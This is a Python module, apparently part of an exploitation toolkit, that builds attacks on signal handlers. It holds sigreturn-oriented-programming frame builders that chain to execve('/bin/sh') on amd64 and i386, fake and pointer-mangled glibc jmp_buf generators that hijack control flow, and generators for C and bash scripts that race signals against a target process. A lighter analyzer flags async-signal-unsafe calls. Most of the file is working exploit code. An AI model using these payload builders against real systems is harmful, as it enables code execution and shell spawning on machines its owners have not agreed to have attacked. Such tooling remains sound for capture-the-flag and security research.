"""
Signal handler exploitation techniques.

Exploits vulnerabilities in signal handler implementations:
- Re-entrancy issues
- Async-signal-unsafe function calls
- Signal handler overwrite
- Longjmp corruption
"""

import struct
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class SignalType(Enum):
    """Common exploitable signals."""
    SIGALRM = 14    # Alarm timer
    SIGINT = 2      # Interrupt (Ctrl+C)
    SIGTERM = 15    # Termination
    SIGSEGV = 11    # Segmentation fault
    SIGFPE = 8      # Floating point exception
    SIGUSR1 = 10    # User-defined signal 1
    SIGUSR2 = 12    # User-defined signal 2
    SIGCHLD = 17    # Child stopped/terminated
    SIGPIPE = 13    # Broken pipe


class VulnType(Enum):
    """Signal handler vulnerability types."""
    NON_REENTRANT = auto()      # Calls non-reentrant functions
    LONGJMP_CORRUPT = auto()    # Corrupted longjmp buffer
    SIGNAL_RACE = auto()        # Race between signals
    HANDLER_OVERWRITE = auto()  # Overwrite handler pointer
    UNSAFE_GLOBAL = auto()      # Modifies global state unsafely


@dataclass
class SignalHandlerInfo:
    """Information about a signal handler."""
    signal_num: int
    signal_name: str
    handler_address: int
    is_default: bool = False
    is_ignored: bool = False
    calls_unsafe_funcs: List[str] = field(default_factory=list)
    modifies_globals: List[str] = field(default_factory=list)
    vulnerability_type: Optional[VulnType] = None


@dataclass
class SignalExploitPlan:
    """Plan for exploiting signal handler vulnerabilities."""
    signal_to_send: int
    timing_window_us: int
    setup_payload: bytes
    trigger_method: str
    expected_result: str


class SignalHandlerAnalyzer:
    """
    Analyze binaries for signal handler vulnerabilities.
    """

    # Functions that are NOT async-signal-safe
    UNSAFE_FUNCTIONS = {
        # Memory allocation
        "malloc", "free", "calloc", "realloc",
        # I/O
        "printf", "fprintf", "sprintf", "snprintf",
        "puts", "fputs", "putchar", "fwrite",
        "scanf", "fscanf", "sscanf",
        "fopen", "fclose", "fflush",
        # String functions (some)
        "strtok", "strerror",
        # Time functions
        "localtime", "gmtime", "ctime", "asctime",
        # Environment
        "getenv", "setenv", "unsetenv",
        # Exit functions
        "exit", "atexit",
        # Random
        "rand", "srand",
        # Locking (can deadlock)
        "pthread_mutex_lock",
    }

    # Functions that ARE async-signal-safe (partial list)
    SAFE_FUNCTIONS = {
        "write", "read", "_exit", "_Exit",
        "signal", "sigaction", "sigprocmask",
        "getpid", "getppid", "getuid", "geteuid",
        "fork", "execve",
    }

    def __init__(self, binary: Binary):
        """
        Initialize analyzer.

        Args:
            binary: Target binary
        """
        self.binary = binary
        self._handlers: List[SignalHandlerInfo] = []

    def find_signal_registrations(self) -> List[Tuple[int, int]]:
        """
        Find signal() and sigaction() calls in binary.

        Returns:
            List of (call_address, signal_number) tuples
        """
        registrations = []

        # Look for signal/sigaction in imports
        signal_funcs = ["signal", "sigaction", "__sysv_signal", "bsd_signal"]

        for func in signal_funcs:
            if hasattr(self.binary, 'plt') and func in self.binary.plt:
                # Find cross-references to this function
                # This would require disassembly analysis
                registrations.append((self.binary.plt[func], 0))

        return registrations

    def analyze_handler(
        self,
        handler_addr: int,
    ) -> SignalHandlerInfo:
        """
        Analyze a signal handler for vulnerabilities.

        Args:
            handler_addr: Address of handler function

        Returns:
            SignalHandlerInfo with analysis results
        """
        unsafe_calls = []
        modifies_globals = []
        vuln_type = None

        # This would require disassembly to properly analyze
        # For now, check if binary uses any unsafe functions

        if hasattr(self.binary, 'plt'):
            for func in self.UNSAFE_FUNCTIONS:
                if func in self.binary.plt:
                    unsafe_calls.append(func)

        if unsafe_calls:
            vuln_type = VulnType.NON_REENTRANT

        return SignalHandlerInfo(
            signal_num=0,
            signal_name="UNKNOWN",
            handler_address=handler_addr,
            calls_unsafe_funcs=unsafe_calls,
            modifies_globals=modifies_globals,
            vulnerability_type=vuln_type,
        )

    def get_vulnerable_handlers(self) -> List[SignalHandlerInfo]:
        """Get list of potentially vulnerable signal handlers."""
        return [h for h in self._handlers if h.vulnerability_type is not None]


class SignalHandlerExploiter:
    """
    Exploit signal handler vulnerabilities.
    """

    def __init__(self, binary: Binary, context: ExploitContext):
        """
        Initialize exploiter.

        Args:
            binary: Target binary
            context: Exploitation context
        """
        self.binary = binary
        self.context = context
        self.arch = context.arch
        self.bits = context.bits

    def generate_sigreturn_frame(
        self,
        rip: int = 0,
        rsp: int = 0,
        syscall_num: int = 59,  # execve
        **kwargs,
    ) -> bytes:
        """
        Generate a fake sigcontext frame for SROP.

        This creates a signal frame that, when restored by sigreturn,
        sets up registers for a syscall.

        Args:
            rip: Instruction pointer (should point to syscall)
            rsp: Stack pointer
            syscall_num: Syscall number (59 = execve)
            **kwargs: Additional register values

        Returns:
            Fake signal frame bytes
        """
        try:
            from pwn import SigreturnFrame, context

            context.arch = self.arch
            context.bits = self.bits

            frame = SigreturnFrame()
            frame.rip = rip
            frame.rsp = rsp
            frame.rax = syscall_num

            # Set additional registers from kwargs
            for reg, val in kwargs.items():
                if hasattr(frame, reg):
                    setattr(frame, reg, val)

            return bytes(frame)

        except ImportError:
            logger.warning("pwntools not available, using manual frame construction")
            return self._build_manual_frame(rip, rsp, syscall_num, **kwargs)

    def _build_manual_frame(
        self,
        rip: int,
        rsp: int,
        syscall_num: int,
        **kwargs,
    ) -> bytes:
        """Manually construct sigreturn frame."""
        if self.arch == "amd64":
            # x86_64 sigcontext structure
            # Simplified - actual structure is larger
            frame = b""
            frame += struct.pack("<Q", kwargs.get("r8", 0))
            frame += struct.pack("<Q", kwargs.get("r9", 0))
            frame += struct.pack("<Q", kwargs.get("r10", 0))
            frame += struct.pack("<Q", kwargs.get("r11", 0))
            frame += struct.pack("<Q", kwargs.get("r12", 0))
            frame += struct.pack("<Q", kwargs.get("r13", 0))
            frame += struct.pack("<Q", kwargs.get("r14", 0))
            frame += struct.pack("<Q", kwargs.get("r15", 0))
            frame += struct.pack("<Q", kwargs.get("rdi", 0))
            frame += struct.pack("<Q", kwargs.get("rsi", 0))
            frame += struct.pack("<Q", kwargs.get("rbp", 0))
            frame += struct.pack("<Q", kwargs.get("rbx", 0))
            frame += struct.pack("<Q", kwargs.get("rdx", 0))
            frame += struct.pack("<Q", syscall_num)  # rax
            frame += struct.pack("<Q", kwargs.get("rcx", 0))
            frame += struct.pack("<Q", rsp)  # rsp
            frame += struct.pack("<Q", rip)  # rip
            frame += struct.pack("<Q", 0)    # eflags
            frame += struct.pack("<H", 0x33) # cs
            frame += struct.pack("<H", 0)    # gs
            frame += struct.pack("<H", 0)    # fs
            frame += struct.pack("<H", 0x2b) # ss
            return frame

        elif self.arch == "i386":
            # x86 sigcontext structure
            frame = b""
            frame += struct.pack("<I", 0)    # gs
            frame += struct.pack("<I", 0)    # fs
            frame += struct.pack("<I", 0)    # es
            frame += struct.pack("<I", 0)    # ds
            frame += struct.pack("<I", kwargs.get("edi", 0))
            frame += struct.pack("<I", kwargs.get("esi", 0))
            frame += struct.pack("<I", kwargs.get("ebp", 0))
            frame += struct.pack("<I", rsp)  # esp
            frame += struct.pack("<I", kwargs.get("ebx", 0))
            frame += struct.pack("<I", kwargs.get("edx", 0))
            frame += struct.pack("<I", kwargs.get("ecx", 0))
            frame += struct.pack("<I", syscall_num)  # eax
            frame += struct.pack("<I", 0)    # trapno
            frame += struct.pack("<I", 0)    # err
            frame += struct.pack("<I", rip)  # eip
            frame += struct.pack("<I", 0x23) # cs
            frame += struct.pack("<I", 0)    # eflags
            frame += struct.pack("<I", rsp)  # esp_at_signal
            frame += struct.pack("<I", 0x2b) # ss
            return frame

        else:
            raise ValueError(f"Unsupported architecture: {self.arch}")

    def generate_srop_execve(
        self,
        binsh_addr: int,
        sigreturn_gadget: int,
        syscall_gadget: int,
    ) -> bytes:
        """
        Generate SROP chain for execve("/bin/sh").

        Args:
            binsh_addr: Address of "/bin/sh" string
            sigreturn_gadget: Address of sigreturn gadget
            syscall_gadget: Address of syscall instruction

        Returns:
            ROP chain bytes
        """
        if self.arch == "amd64":
            # x86_64 execve syscall
            # rax = 59, rdi = "/bin/sh", rsi = NULL, rdx = NULL
            frame = self.generate_sigreturn_frame(
                rip=syscall_gadget,
                rsp=0,
                syscall_num=59,
                rdi=binsh_addr,
                rsi=0,
                rdx=0,
            )

            # Chain: sigreturn gadget -> frame
            pack = struct.pack("<Q", sigreturn_gadget)
            return pack + frame

        elif self.arch == "i386":
            # x86 execve syscall
            # eax = 11, ebx = "/bin/sh", ecx = NULL, edx = NULL
            frame = self.generate_sigreturn_frame(
                rip=syscall_gadget,
                rsp=0,
                syscall_num=11,
                ebx=binsh_addr,
                ecx=0,
                edx=0,
            )

            pack = struct.pack("<I", sigreturn_gadget)
            return pack + frame

        else:
            raise ValueError(f"Unsupported architecture: {self.arch}")

    def generate_double_handler_race(
        self,
        signal_a: int,
        signal_b: int,
        target_state: Dict[str, Any],
    ) -> str:
        """
        Generate code to race two signal handlers.

        Args:
            signal_a: First signal number
            signal_b: Second signal number
            target_state: Desired corruption state

        Returns:
            C source code
        """
        code = f'''/*
 * Signal Handler Race Exploit
 * Races {signal_a} and {signal_b} handlers
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>

volatile int race_won = 0;
pid_t target_pid;

void *send_signal_a(void *arg) {{
    while (!race_won) {{
        kill(target_pid, {signal_a});
        usleep(1);
    }}
    return NULL;
}}

void *send_signal_b(void *arg) {{
    while (!race_won) {{
        kill(target_pid, {signal_b});
        usleep(1);
    }}
    return NULL;
}}

int main(int argc, char **argv) {{
    if (argc < 2) {{
        fprintf(stderr, "Usage: %s <target_pid>\\n", argv[0]);
        return 1;
    }}

    target_pid = atoi(argv[1]);
    printf("[*] Racing signals {signal_a} and {signal_b} against PID %d\\n", target_pid);

    pthread_t t1, t2;
    pthread_create(&t1, NULL, send_signal_a, NULL);
    pthread_create(&t2, NULL, send_signal_b, NULL);

    // Run for a bit
    sleep(5);
    race_won = 1;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("[*] Race complete\\n");
    return 0;
}}
'''
        return code


class LongjmpCorruptor:
    """
    Exploit longjmp buffer corruption vulnerabilities.
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize corruptor.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.arch = context.arch
        self.bits = context.bits

    def generate_fake_jmpbuf(
        self,
        target_rip: int,
        target_rsp: int = 0,
        **kwargs,
    ) -> bytes:
        """
        Generate a fake jmp_buf structure.

        When longjmp is called with this buffer, it will
        jump to target_rip.

        Args:
            target_rip: Destination instruction pointer
            target_rsp: Stack pointer to set
            **kwargs: Additional register values

        Returns:
            Fake jmp_buf bytes
        """
        if self.arch == "amd64":
            # glibc x86_64 jmp_buf layout (mangled with PTR_MANGLE)
            # Without mangling for simplicity:
            # [0] rbx
            # [1] rbp
            # [2] r12
            # [3] r13
            # [4] r14
            # [5] r15
            # [6] rsp
            # [7] rip

            jmpbuf = b""
            jmpbuf += struct.pack("<Q", kwargs.get("rbx", 0))
            jmpbuf += struct.pack("<Q", kwargs.get("rbp", 0))
            jmpbuf += struct.pack("<Q", kwargs.get("r12", 0))
            jmpbuf += struct.pack("<Q", kwargs.get("r13", 0))
            jmpbuf += struct.pack("<Q", kwargs.get("r14", 0))
            jmpbuf += struct.pack("<Q", kwargs.get("r15", 0))
            jmpbuf += struct.pack("<Q", target_rsp)
            jmpbuf += struct.pack("<Q", target_rip)
            return jmpbuf

        elif self.arch == "i386":
            # glibc x86 jmp_buf layout
            # [0] ebx
            # [1] esi
            # [2] edi
            # [3] ebp
            # [4] esp
            # [5] eip

            jmpbuf = b""
            jmpbuf += struct.pack("<I", kwargs.get("ebx", 0))
            jmpbuf += struct.pack("<I", kwargs.get("esi", 0))
            jmpbuf += struct.pack("<I", kwargs.get("edi", 0))
            jmpbuf += struct.pack("<I", kwargs.get("ebp", 0))
            jmpbuf += struct.pack("<I", target_rsp)
            jmpbuf += struct.pack("<I", target_rip)
            return jmpbuf

        else:
            raise ValueError(f"Unsupported architecture: {self.arch}")

    def generate_mangled_jmpbuf(
        self,
        target_rip: int,
        pointer_guard: int,
        target_rsp: int = 0,
    ) -> bytes:
        """
        Generate jmp_buf with PTR_MANGLE applied.

        glibc mangles pointers in jmp_buf using:
        mangled = (ptr >> 0x11) ^ pointer_guard

        Args:
            target_rip: Destination (unmangled)
            pointer_guard: fs:[0x30] value (leaked)
            target_rsp: Stack pointer (unmangled)

        Returns:
            Mangled jmp_buf
        """
        def mangle(ptr: int) -> int:
            """Apply PTR_MANGLE transformation."""
            # Rotate left by 0x11 bits then XOR with guard
            rotated = ((ptr << 0x11) | (ptr >> (64 - 0x11))) & ((1 << 64) - 1)
            return rotated ^ pointer_guard

        if self.arch == "amd64":
            mangled_rsp = mangle(target_rsp)
            mangled_rip = mangle(target_rip)

            jmpbuf = b""
            jmpbuf += struct.pack("<Q", 0)  # rbx
            jmpbuf += struct.pack("<Q", 0)  # rbp
            jmpbuf += struct.pack("<Q", 0)  # r12
            jmpbuf += struct.pack("<Q", 0)  # r13
            jmpbuf += struct.pack("<Q", 0)  # r14
            jmpbuf += struct.pack("<Q", 0)  # r15
            jmpbuf += struct.pack("<Q", mangled_rsp)
            jmpbuf += struct.pack("<Q", mangled_rip)
            return jmpbuf

        else:
            raise ValueError("Mangled jmp_buf only supported for amd64")


def generate_signal_race_exploit(
    target_pid_or_cmd: str,
    signal_to_race: int = 14,  # SIGALRM
) -> str:
    """
    Generate a signal racing exploit script.

    Args:
        target_pid_or_cmd: Target PID or command to spawn
        signal_to_race: Signal number to race

    Returns:
        Bash exploit script
    """
    script = f'''#!/bin/bash
# Signal Race Condition Exploit
# Target: {target_pid_or_cmd}
# Signal: {signal_to_race}

TARGET="{target_pid_or_cmd}"

# Check if target is a PID or command
if [[ "$TARGET" =~ ^[0-9]+$ ]]; then
    PID=$TARGET
else
    # Spawn target in background
    $TARGET &
    PID=$!
    sleep 0.1
fi

echo "[*] Target PID: $PID"
echo "[*] Racing signal {signal_to_race}..."

# Rapidly send signals to try to trigger race
for i in $(seq 1 100000); do
    kill -{signal_to_race} $PID 2>/dev/null || break
done &

# Run another signal in parallel
for i in $(seq 1 100000); do
    kill -{signal_to_race} $PID 2>/dev/null || break
done &

wait

echo "[*] Signal race complete"
'''
    return script
